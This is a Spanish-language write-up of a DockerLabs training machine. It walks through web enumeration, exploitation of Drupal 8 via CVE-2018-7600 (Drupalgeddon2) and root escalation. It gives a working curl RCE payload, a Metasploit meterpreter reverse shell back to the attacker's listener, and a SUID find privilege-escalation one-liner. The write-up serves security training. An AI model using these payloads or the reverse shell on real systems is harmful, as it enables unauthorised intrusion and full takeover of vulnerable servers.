# DockerLabs - Ejotapete

Explotación de Drupal 8 mediante CVE-2018-7600 (Drupalgeddon2) con el CMS corriendo en un subdirectorio, y escalada a root vía binario find con SUID.

## Despliegue

```bash
bash auto_deploy.sh ejotapete.tar
```

## Reconocimiento

```bash
nmap -sCV -p- 172.17.0.2
```

Puerto detectado:
- **80/tcp** — HTTP (Apache)

La raíz del servidor devuelve **403 Forbidden**.

## Enumeración web

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```

Directorio encontrado:
- `/drupal/` — instalación de Drupal 8

Versión confirmada:

```bash
curl -s http://172.17.0.2/drupal/CHANGELOG.txt | head -5
# Drupal 8.x
```

## Intrusión — CVE-2018-7600 (Drupalgeddon2)

Drupal 8 es vulnerable a RCE sin autenticación a través del endpoint `/user/register`. El sistema de formularios AJAX acepta callbacks PHP arbitrarios en el parámetro `#post_render`.

Verificar RCE:

```bash
curl -s -X POST "http://172.17.0.2/drupal/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id'
# uid=33(www-data)
```

Reverse shell con Metasploit (target 8 = Drupal 8.x):

```bash
msfconsole -q
use exploit/multi/http/drupal_drupalgeddon2
set RHOSTS 172.17.0.2
set TARGETURI /drupal
set target 8
set payload php/meterpreter/reverse_tcp
set LHOST 172.17.0.1
set LPORT 4444
run
```

Desde Meterpreter, obtener shell interactiva:

```bash
shell
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Acceso como **www-data**.

## Escalada — www-data → root (vía 1: SUID find)

```bash
find / -perm -4000 2>/dev/null
# /usr/bin/find  ← SUID
```

GTFOBins con find SUID:

```bash
find . -exec /bin/bash -p \; -quit
whoami
# root
```

## Escalada — www-data → root (vía 2: sudo)

```bash
sudo -l
```

Comprobar binarios disponibles como sudo sin contraseña y explotar según GTFOBins.

## Conclusión

Cadena de ataque completa:

1. **Reconocimiento** — nmap detecta puerto 80, raíz con 403
2. **Enumeración** — gobuster encuentra /drupal/ con Drupal 8
3. **CVE-2018-7600** — RCE sin autenticación via endpoint /user/register
4. **Reverse shell** — Metasploit drupalgeddon2 target 8 → www-data
5. **SUID find** — `find . -exec /bin/bash -p \;` → root

**Lecciones aprendidas:**
- Drupal fuera de la raíz no lo protege — gobuster lo encuentra igualmente.
- CVE-2018-7600 afecta a Drupal 7 y 8 pero con endpoints distintos. En Drupal 8 el vector es `/user/register` con `#post_render`.
- `find` con SUID es escalada trivial — GTFOBins tiene el one-liner directo.
- En Metasploit, `show targets` y seleccionar el target correcto (Drupal 8.x) es clave cuando el exploit falla con la configuración por defecto.
